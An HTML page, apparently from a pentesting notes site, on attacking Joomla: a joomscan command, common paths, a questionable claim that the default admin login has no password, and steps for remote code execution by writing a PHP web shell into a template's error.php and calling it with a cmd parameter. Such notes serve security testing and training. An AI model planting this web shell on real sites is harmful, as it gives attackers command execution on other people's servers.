<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="readloud">
    
    <link rel="shortcut icon" href="../../../img/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Joomla CMS Pentesting - readloud.org</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Joomla CMS Pentesting", url: "#_top", children: [
              {title: "Scan", url: "#scan" },
              {title: "Common Directories", url: "#common-directories" },
              {title: "Default Credentials", url: "#default-credentials" },
              {title: "RCE", url: "#rce" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    

    <h1 id="joomla-cms-pentesting">Joomla CMS Pentesting</h1>
<p>Joomla is a content managemen system (CMS).</p>
<div class="language-text highlight"><pre><span></span><code>- [cmsjunkie](https://www.cmsjunkie.com/blog/post/understanding-the-joomla-directory-structure)
</code></pre></div>
<h2 id="scan">Scan</h2>
<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>joomscan -u https://example.com
</span></code></pre></div>
<p><br /></p>
<h2 id="common-directories">Common Directories</h2>
<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>/administrator/
</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>/administrator/manifests/files/joomla.xml
</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>/cache/
</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>/components/
</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>/configuration.php
</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>/htaccess.txt
</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>/includes/
</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>/index.php
</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a>/joomla.xml
</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a>/language/en-GB/en-GB.xml
</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a>/libraries/
</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a>/LICENSE.txt
</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a>/logs/
</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a>/media/
</span><span id="__span-1-15"><a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a>/modules/
</span><span id="__span-1-16"><a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a>/plugins/
</span><span id="__span-1-17"><a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a>/README.txt
</span><span id="__span-1-18"><a id="__codelineno-1-18" name="__codelineno-1-18" href="#__codelineno-1-18"></a>/templates/
</span><span id="__span-1-19"><a id="__codelineno-1-19" name="__codelineno-1-19" href="#__codelineno-1-19"></a>/tmp/
</span><span id="__span-1-20"><a id="__codelineno-1-20" name="__codelineno-1-20" href="#__codelineno-1-20"></a>/web.config.txt
</span></code></pre></div>
<p><br /></p>
<h2 id="default-credentials">Default Credentials</h2>
<p>The default username is <strong>"admin"</strong> and no password.</p>
<p><br /></p>
<h2 id="rce">RCE</h2>
<p>Reference: <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla#rce">HackTricks</a></p>
<p>If we have admin credential, we may be able to execute arbitrary code by manipulating the site template.</p>
<h3 id="1-login-as-admin">1. Login as Admin</h3>
<p>At first, go to <code>/administrator</code> page and login with admin credential.</p>
<h3 id="2-select-template">2. Select Template</h3>
<p>In dashboard, go to template select menu, and click a template name. We can see the list of pages of the template on left menu.<br />
Here we edit the <code>error.php</code> so click it on the left menu.</p>
<h3 id="3-inject-arbitrary-code">3. Inject Arbitrary Code</h3>
<p>In the editor for <code>error.php</code>, delete the original PHP code and insert arbitrary PHP code such as:</p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="p">&lt;</span><span class="k">?</span><span class="n">php</span> <span class="n">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span> <span class="p">?&gt;</span>
</span></code></pre></div>
<p>If we want to get the target shell, we can insert the code for reverse shell. Please see the <a href="https://exploit-notes.hdks.org/exploit/shell/web-reverse-shell/">Web Reverse Shell</a> page for details.<br />
After that, click <strong>Save &amp; Close</strong> .</p>
<h3 id="4-execute">4. Execute</h3>
<p>Now access to the template‚Äôs <code>error.php</code> page as below:</p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="n">https</span><span class="p">://</span><span class="n">example</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">templates</span><span class="p">/&lt;</span><span class="n">template_name</span><span class="p">&gt;/</span><span class="n">error</span><span class="p">.</span><span class="n">php</span>
</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="c"># or</span>
</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="n">https</span><span class="p">://</span><span class="n">example</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">templates</span><span class="p">/&lt;</span><span class="n">template_name</span><span class="p">&gt;/</span><span class="n">error</span><span class="p">.</span><span class="n">php</span><span class="k">?</span><span class="n">cmd</span><span class="p">=</span><span class="n">whoami</span>
</span></code></pre></div>

  <br>
    

    <br>
</div>

<footer class="col-md-12 wm-page-content">
      <p>
        <a href="https://github.com/readloud/readloud.github.io/releases/tag/themes/edit/master/docs/web/cms/joomla-cms-pentesting.md"><i class="fa fa-github"></i>
Edit on GitHub</a>
      </p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/noraj/mkdocs-windmill-dark">Windmill Dark</a> theme by Alexandre ZANNI (noraj).</p>
<p>        ‚ö†Ô∏è The quieter you become, the more you are able to hear ü•∑</p>
</footer>

</body>
</html>